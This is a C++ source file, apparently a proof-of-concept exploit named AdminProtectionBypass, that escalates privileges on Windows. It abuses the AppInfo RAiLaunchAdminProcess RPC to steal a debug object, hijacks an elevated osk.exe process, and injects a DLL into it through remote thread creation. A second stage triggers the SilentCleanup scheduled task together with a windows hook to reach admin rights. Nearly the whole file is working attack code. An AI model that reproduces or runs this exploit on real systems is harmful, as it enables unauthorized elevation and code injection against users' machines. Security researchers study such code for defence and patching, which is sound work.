// AdminProtectionBypass.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#pragma comment(lib, "rpcrt4.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "pathcch.lib")
#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsupp.lib")
#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <string>
#include <sddl.h>
#include <pathcch.h>
#include <comdef.h>
#include <taskschd.h>
#include "service_h.h"

extern "C" void __RPC_FAR* __RPC_USER midl_user_allocate(size_t cBytes)
{
	return((void __RPC_FAR*) malloc(cBytes));
}

extern "C" void __RPC_USER midl_user_free(void __RPC_FAR* p)
{
	free(p);
}

extern "C" void DbgUiSetThreadDebugObject(HANDLE DebugObject);
extern "C" NTSTATUS DbgUiStopDebugging(HANDLE Process);

class ScopedHandle {
private:
	HANDLE _handle;

public:
	ScopedHandle() : _handle(nullptr) {}
	ScopedHandle(HANDLE handle) : _handle(handle) {}
	~ScopedHandle() {
		if (!_handle || _handle == INVALID_HANDLE_VALUE) {
			return;
		}

		CloseHandle(_handle);
	}
	ScopedHandle(const ScopedHandle&) = delete;
	ScopedHandle operator=(const ScopedHandle*) = delete;
	ScopedHandle(ScopedHandle&& other) noexcept {
		_handle = other._handle;
		other._handle = nullptr;
	}

	HANDLE* ptr() {
		return &_handle;
	}
	HANDLE get() const {
		return _handle;
	}
	bool valid() const {
		return !!_handle;
	}
	HANDLE detach() {
		HANDLE ret = _handle;
		_handle = nullptr;
		return ret;
	}
};

static std::wstring GetExecutablePath() {
	WCHAR path[MAX_PATH];
	DWORD len = MAX_PATH;
	if (!QueryFullProcessImageName(GetCurrentProcess(), 0, path, &len)) {
		printf("Error querying process path: %d\n", GetLastError());
		throw 1;
	}

	return path;
}

static std::wstring GetDllPath() {
	std::wstring exepath = GetExecutablePath();
	WCHAR path[MAX_PATH];
	HRESULT hr = PathCchCombine(path, MAX_PATH, exepath.c_str(), L"..\\StartProcess.dll");
	if (FAILED(hr)) {
		printf("Error building DLL path: %08X\n", hr);
		throw 1;
	}
	return path;
}

static ScopedHandle GetDebugObjectHandle(HANDLE process)
{
	HANDLE ret = nullptr;
	ULONG len;
	NTSTATUS status = NtQueryInformationProcess(process, (PROCESSINFOCLASS)30, &ret, sizeof(ret), &len);
	if (FAILED(status))
	{
		printf("Error getting debug object handle: %08X\n", status);
		throw 1;
	}
	return ret;
}

static handle_t bind_handle()
{
	RPC_STATUS RpcStatus;
	RPC_WSTR StringBinding;
	handle_t BindingHandle;

	if (RpcStringBindingComposeW(nullptr, (RPC_WSTR)L"ncalrpc", nullptr, nullptr, nullptr, &StringBinding) != RPC_S_OK)
		return nullptr;

	RpcStatus = RpcBindingFromStringBindingW(StringBinding, &BindingHandle);

	RpcStringFreeW(&StringBinding);

	if (RpcStatus != RPC_S_OK)
		return nullptr;

	RpcStatus = RpcEpResolveBinding(BindingHandle, intf_201ef99a_7fa0_444c_9399_19ba84f12a1a_v1_0_c_ifspec);
	if (RpcStatus != RPC_S_OK)
		return nullptr;

	return BindingHandle;
}

static handle_t rpc_handle = bind_handle();

static ScopedHandle OpenToken(HANDLE process) {
	ScopedHandle handle;
	if (!OpenProcessToken(process, TOKEN_QUERY, handle.ptr())) {
		printf("Error opening process token: %d\n", GetLastError());
		throw 1;
	}
	return handle;
}

static int LaunchAdminProcess(LPCWSTR path, APP_PROCESS_INFORMATION& procinfo, bool elevate) {
	RpcTryExcept{
		APP_STARTUP_INFO start_info = {};
		long type = 0;
		return RAiLaunchAdminProcess(rpc_handle, path, L"dummy", elevate ? 1 : 0, 
			DEBUG_PROCESS | CREATE_UNICODE_ENVIRONMENT, 
			L"c:\\windows\\system32", L"WinSta0\\Default",
			&start_info, 0, INFINITE, &procinfo, &type);
	}
	RpcExcept(1) {
		return RpcExceptionCode();
	}
	RpcEndExcept
}

struct ProcessInformation {
	ScopedHandle process;
	ScopedHandle thread;

	ProcessInformation(const APP_PROCESS_INFORMATION& procinfo) :
		process(reinterpret_cast<HANDLE>(procinfo.ProcessHandle)),
		thread(reinterpret_cast<HANDLE>(procinfo.ThreadHandle))
	{
	}

	ProcessInformation(HANDLE hprocess, HANDLE hthread) :
		process(hprocess),
		thread(hthread)
	{
	}

	void StopDebugging() const
	{
		NTSTATUS status = DbgUiStopDebugging(process.get());
		if (FAILED(status))
		{
			printf("Error stopping debugging of process: %08X\n", status);
			throw 1;
		}
	}

	void Terminate(DWORD exitcode) const 
	{
		if (!TerminateProcess(process.get(), exitcode))
		{
			printf("Error terminating process: %d\n", GetLastError());
		}
	}

	void Resume() const {
		ResumeThread(thread.get());
	}
};

static ProcessInformation LaunchAdminProcess(LPCWSTR path, bool elevate) {
	APP_PROCESS_INFORMATION procinfo = {};
	int res = LaunchAdminProcess(path, procinfo, elevate);
	if (res == 0) {
		return ProcessInformation(procinfo);
	}
	printf("Error creating process: %d\n", res);
	throw 1;
}

static void SetupDebugObject() {
	ProcessInformation procinfo = LaunchAdminProcess(GetExecutablePath().c_str(), false);
	ScopedHandle debug_obj = GetDebugObjectHandle(procinfo.process.get());
	printf("Got debug object: %p\n", debug_obj.get());
	DbgUiSetThreadDebugObject(debug_obj.detach());
	procinfo.Terminate(1);
	procinfo.StopDebugging();
}

static ProcessInformation GetPrivilegedProcess() {
	ProcessInformation procinfo = LaunchAdminProcess(L"c:\\windows\\system32\\osk.exe", false);
	DEBUG_EVENT debug_event = {};

	for (;;) {
		if (!WaitForDebugEventEx(&debug_event, INFINITE))
		{
			printf("Error waiting for process debug event: %d\n", GetLastError());
			throw 1;
		}

		if (debug_event.dwDebugEventCode != CREATE_PROCESS_DEBUG_EVENT)
		{
			ContinueDebugEvent(debug_event.dwProcessId, debug_event.dwThreadId, DBG_CONTINUE);
		}
		else
		{
			ScopedHandle new_process;
			if (!DuplicateHandle(debug_event.u.CreateProcessInfo.hProcess, GetCurrentProcess(), 
				GetCurrentProcess(), new_process.ptr(), 0, FALSE, DUPLICATE_SAME_ACCESS))
			{
				printf("Error duplicating process handle: %d\n", GetLastError());
				throw 1;
			}
			ScopedHandle new_thread;
			if (!DuplicateHandle(GetCurrentProcess(), debug_event.u.CreateProcessInfo.hThread,
				GetCurrentProcess(), new_thread.ptr(), 0, FALSE, DUPLICATE_SAME_ACCESS))
			{
				printf("Error duplicating thread handle: %d\n", GetLastError());
				throw 1;
			}
			return ProcessInformation(new_process.detach(), new_thread.detach());
		}
	}
}

static DWORD RunThread(HANDLE process, HMODULE hMod, LPCSTR name, const std::wstring& value) {
	size_t value_len = (value.size() + 1) * sizeof(wchar_t);
	PVOID buffer = VirtualAllocEx(process, nullptr, value_len , MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!buffer) {
		printf("Error allocating buffer: %d\n", GetLastError());
		throw 1;
	}

	printf("Buffer in privileged process: %p\n", buffer);
	SIZE_T bytes_written;
	if (!WriteProcessMemory(process, buffer, value.c_str(), value_len, &bytes_written)) {
		printf("Error writing buffer: %d\n", GetLastError());
		throw 1;
	}

	FARPROC func = GetProcAddress(hMod, name);
	if (!func) {
		printf("Error getting procedure from module: %d\n", GetLastError());
		throw 1;
	}
	DWORD thread_id = 0;
	ScopedHandle thread(CreateRemoteThread(process, nullptr, 0, (LPTHREAD_START_ROUTINE)func, buffer, 0, &thread_id));
	if (!thread.valid()) {
		printf("Error creating remote thread: %d\n", GetLastError());
		throw 1;
	}
	WaitForSingleObject(thread.get(), 10000);
	DWORD exit_code = -1;
	GetExitCodeThread(thread.get(), &exit_code);
	return exit_code;
}

static void InjectDll(const ProcessInformation& procinfo) {
	std::wstring dllpath = GetDllPath();
	std::wstring exepath = GetExecutablePath();
	HMODULE hMod = LoadLibraryW(dllpath.c_str());
	if (!hMod)
	{
		printf("Error loading library: %d\n", GetLastError());
		throw 1;
	}

	RunThread(procinfo.process.get(), GetModuleHandle(L"kernel32.dll"), "LoadLibraryW", dllpath.c_str());
	RunThread(procinfo.process.get(), hMod, "StartProcess", exepath.c_str());
}

static void ElevateToHighIL() {
	SetupDebugObject();
	ProcessInformation procinfo = GetPrivilegedProcess();
	procinfo.StopDebugging();
	InjectDll(procinfo);
}

__declspec(dllimport) bool SetupHook();
__declspec(dllimport) bool RemoveHook();

class CoInit {
public:
	CoInit() {
		HRESULT hr = CoInitializeEx(nullptr, COINIT_MULTITHREADED);
		if (FAILED(hr)) {
			printf("Error initializing COM: %08X\n", hr);
			throw 1;
		}

		hr = CoInitializeSecurity(
				nullptr,
				-1,
				nullptr,
				nullptr,
				RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
				RPC_C_IMP_LEVEL_IMPERSONATE,
				nullptr,
				0,
				nullptr);
		if (FAILED(hr)) {
			printf("Error initializing COM security: %08X\n", hr);
			throw 1;
		}
	}
	~CoInit() {
		CoUninitialize();
	}
};

class WindowsHooker {
public:
	WindowsHooker() {
		if (!SetupHook())
		{
			printf("Error setting up windows hook\n");
			throw 1;
		}
	}
	~WindowsHooker() {
		RemoveHook();
	}
};

_COM_SMARTPTR_TYPEDEF(ITaskService, IID_ITaskService);
_COM_SMARTPTR_TYPEDEF(ITaskFolder, IID_ITaskFolder);
_COM_SMARTPTR_TYPEDEF(IRegisteredTask, IID_IRegisteredTask);
_COM_SMARTPTR_TYPEDEF(IRunningTask, IID_IRunningTask);

static void ElevateToAdmin() {
	WindowsHooker hooker;

	CoInit ci;
	ITaskServicePtr pService;
	HRESULT hr = CoCreateInstance(CLSID_TaskScheduler,
		nullptr,
		CLSCTX_INPROC_SERVER,
		IID_PPV_ARGS(&pService));
	if (FAILED(hr))
	{
		printf("Failed to create ITaskService: %08X\n", hr);
		return;
	}

	hr = pService->Connect(_variant_t(), _variant_t(),
		_variant_t(), _variant_t());
	if (FAILED(hr))
	{
		printf("ITaskService::Connect failed: %08X", hr);
		return;
	}

	ITaskFolderPtr pRootFolder;
	hr = pService->GetFolder(_bstr_t(L"\\Microsoft\\Windows\\DiskCleanup"), &pRootFolder);
	if (FAILED(hr))
	{
		printf("Cannot get DiskCleanup folder: %08X", hr);
		return;
	}

	IRegisteredTaskPtr task;
	hr = pRootFolder->GetTask(_bstr_t(L"SilentCleanup"), &task);
	if (FAILED(hr))
	{
		printf("Cannot get SilentCleanup task: %08X", hr);
		return;
	}

	IRunningTaskPtr running;
	hr = task->RunEx(_variant_t(), TASK_RUN_IGNORE_CONSTRAINTS, -1, nullptr, &running);
	if (FAILED(hr))
	{
		printf("Cannot start SilentCleanup task: %08X", hr);
		return;
	}

	int count = 0;
	while (count < 10) {
		Sleep(500);
		TASK_STATE state;
		hr = task->get_State(&state);
		if (FAILED(hr))
		{
			printf("Failed to get SilentCleanup task state: %08X", hr);
			return;
		}
		if (state != TASK_STATE_RUNNING) {
			break;
		}
	}
}

int wmain(int argc, wchar_t** argv) {
	try {
		if (argc > 1) {
			ElevateToAdmin();
		}
		else {
			ElevateToHighIL();
		}
	}
	catch (...) {
	}
}